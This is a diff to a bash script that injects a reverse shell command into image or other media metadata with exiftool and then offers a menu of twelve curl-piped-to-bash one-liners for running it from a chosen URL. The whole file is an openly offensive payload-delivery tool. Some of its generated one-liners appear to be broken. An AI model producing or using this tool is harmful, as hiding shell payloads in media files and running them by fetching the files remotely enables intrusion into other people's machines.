@@ -20,71 +20,16 @@
 # ------------------------------------------------
 
 show_help() {
-    echo "Usage: $0 [OPTIONS] <REVERSE_SHELL_COMMAND> <FILE_PATH>"
-    echo "Inject a reverse shell command into supported file types and generate a one-liner execution method."
+    echo "Usage: $0 [OPTIONS] <REVERSE_SHELL_COMMAND> <filename>"
+    echo "Inject a reverse shell command into an image and generate a one-liner execution method."
     echo ""
     echo "Options:"
     echo "  -h, --help           Display this help message."
     echo ""
     echo "Arguments:"
     echo "  <REVERSE_SHELL_COMMAND> The reverse shell command to inject."
-    echo "  <FILE_PATH>          The path to the file (jpg, jpeg, png, mp4, html, htm, zip, rar, pdf, doc, xls, ppt, docx, pptx, xlsx, txt)."
+    echo "  <filename>     The name of the image file."
     echo ""
-}
-
-inject_metadata() {
-    local file="$1"
-    local command="$2"
-    
-    case "$file" in
-        *.jpg|*.jpeg|*.png|*.mp4|*.html|*.htm|*.zip|*.rar|*.pdf|*.doc|*.xls|*.ppt|*.docx|*.pptx|*.xlsx|*.txt)
-            exiftool -Comment="$command" "$file"
-            ;;
-        *)
-            echo "Error: Unsupported file type. Supported types are: jpg, jpeg, png, mp4, html, htm, zip, rar, pdf, doc, xls, ppt, docx, pptx, xlsx, txt."
-            exit 1
-            ;;
-    esac
-}
-
-generate_one_liner() {
-    local file="$1"
-    local base_url="$2"
-    
-    case "$file" in
-        *.jpg|*.jpeg|*.png)
-            echo "Supported Extensions: jpg, jpeg, png"
-            echo "Generated one-liner: curl -s '$base_url/$file' | exiftool -Comment -b - | bash"
-            ;;
-        *.mp4)
-            echo "Supported Extension: mp4"
-            echo "Generated one-liner: curl -s '$base_url/$file' | exiv2 -Comment -b - | bash"
-            ;;
-        *.html|*.htm)
-            echo "Supported Extensions: html, htm"
-            echo "Generated one-liner: curl -s '$base_url/$file' | grep -o '<!--.*-->' | bash"
-            ;;
-        *.zip)
-            echo "Supported Extension: zip"
-            echo "Generated one-liner: curl -s '$base_url/$file' | unzip -p - | grep -o 'Comment: .*' | bash"
-            ;;
-        *.rar)
-            echo "Supported Extension: rar"
-            echo "Generated one-liner: curl -s '$base_url/$file' | unrar p -p- | grep -o 'Comment: .*' | bash"
-            ;;
-        *.pdf|*.doc|*.xls|*.ppt|*.docx|*.pptx|*.xlsx)
-            echo "Supported Extensions: pdf, doc, xls, ppt, docx, pptx, xlsx"
-            echo "Generated one-liner: curl -s '$base_url/$file' | exiftool -Comment -b - | bash"
-            ;;
-        *.txt)
-            echo "Supported Extension: txt"
-            echo "Generated one-liner: curl -s '$base_url/$file' | grep -o 'Comment: .*' | bash"
-            ;;
-        *)
-            echo "Error: Unsupported file type. Supported types are: jpg, jpeg, png, mp4, html, htm, zip, rar, pdf, doc, xls, ppt, docx, pptx, xlsx, txt."
-            exit 1
-            ;;
-    esac
 }
 
 if [ "$1" == "-h" ] || [ "$1" == "--help" ]; then
@@ -92,18 +37,114 @@ if [ "$1" == "-h" ] || [ "$1" == "--help" ]; then
     exit 0
 fi
 
-if [ $# -lt 2 ]; then
+if [ $# -ne 2 ]; then
     echo "Error: Invalid number of arguments."
     show_help
     exit 1
 fi
 
 command="$1"
-file_path="$2"
-file_name=$(basename "$file_path")
+filename="$2"
 
-inject_metadata "$file_path" "$command"
+exiftool -Comment="$command" "$filename"
 
-read -p "Enter the base URL for remote files (e.g., http://www.example.com): " base_url
+echo "Command injection completed."
 
-generate_one_liner "$file_name" "$base_url"
+read -p "Enter the URL path to the image file (e.g., http://www.example.com/): " url
+
+echo "Execution methods compatible with image file format."
+echo "1. image-exiftool-one-liner"
+echo "2. image-exiv2-one-liner"
+echo "3. image-identify-one-liner"
+echo "4. image-file-grep-one-liner"
+echo "5. image-jpeginfo-grep-one-liner"
+echo "6. image-exiftool-zip"
+
+echo "Execution method compatible with video file format."
+echo "7. video-exiftool-one-liner"
+echo "8. video-mediainfo-one-liner"
+echo "9. video-ffprobe-one-liner"
+echo "10. video-exiftool-zip"
+
+echo "Execution method compatible with text file format."
+echo "11. text-sed-one-liner"
+echo "12. text-exiftool-zip"
+read -p "Enter the method number (1-12): " method_choice
+
+case "$method_choice" in
+    1)
+        echo -e "\e[34mGenerating one-liner method with exiftool..."
+        one_liner="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
+        echo "Generated one-liner:"
+        echo -e "$one_liner\e[0m"
+        ;;
+    2)
+        echo -e "\e[34mGenerating one-liner method with exiv2..."
+        one_liner="curl -s '$url/$filename' | exiv2 -p c | bash"
+        echo "Generated one-liner:"
+        echo -e "$one_liner\e[0m"
+        ;;
+    3)
+        echo -e "\e[34mGenerating one-liner method with identify..."
+        one_liner="curl -s '$url/$filename' | identify -format '%c' | bash"
+        echo "Generated one-liner:"
+        echo -e "$one_liner\e[0m"
+        ;;
+    4)
+        echo -e "\e[34mGenerating one-liner method with file and grep..."
+        one_liner="curl -s '$url/$filename' | file - | grep -o 'comment: \".*\"' | bash"
+        echo "Generated one-liner:"
+        echo -e "$one_liner\e[0m"
+        ;;
+    5)
+        echo -e "\e[34mGenerating one-liner method with jpeginfo and grep..."
+        one_liner="curl -s '$url/$filename' | jpeginfo -ls - | grep -o '/bin/sh [^\"']*' | bash"
+        echo "Generated one-liner:"
+        echo -e "$one_liner\e[0m"
+        ;;
+    6)
+        echo -e "\e[34mGenerating one-liner method with exiftool, image/video through zip..."
+        one_liner="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
+        echo "Generated one-liner:"
+        echo -e "$one_liner\e[0m"
+        ;;
+    7)
+        echo -e "\e[34mGenerating one-liner method with exiftool..."
+        one_liner="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
+        echo "Generated one-liner:"
+        echo -e "$one_liner\e[0m"
+        ;;
+    8)
+        echo -e "\e[34mGenerating one-liner method with mediainfo..."
+        one_liner="curl -s '$url/$filename' | mediainfo --Output="General;%Comment%" | bash"
+        echo "Generated one-liner:"
+        echo -e "$one_liner\e[0m"
+        ;;
+    9)
+        echo -e "\e[34mGenerating one-liner method with ffprobe..."
+        one_liner="curl -s '$url/$filename' | ffprobe -v error -show_entries format_tags=comment -of default=nw=1:nk=1 | bash"
+        echo "Generated one-liner:"
+        echo -e "$one_liner\e[0m"
+        ;;
+    10)
+        echo -e "\e[34mGenerating one-liner method with exiftool through zip..."
+        one_liner="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
+        echo "Generated one-liner:"
+        echo -e "$one_liner\e[0m"
+        ;;
+    11)
+        echo -e "\e[34mGenerating one-liner method with sed..."
+        one_liner="curl -s '$url/$filename' | sed 's/<rs>//g' | sed 's/</rs>//' | bash"
+        echo "Generated one-liner:"
+        echo -e "$one_liner\e[0m"
+        ;;
+    12)
+        echo -e "\e[34mGenerating one-liner method with exiftool through zip..."
+        one_liner="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
+        echo "Generated one-liner:"
+        echo -e "$one_liner\e[0m"
+        ;;
+    *)
+        echo "Invalid method choice."
+        ;;
+esac
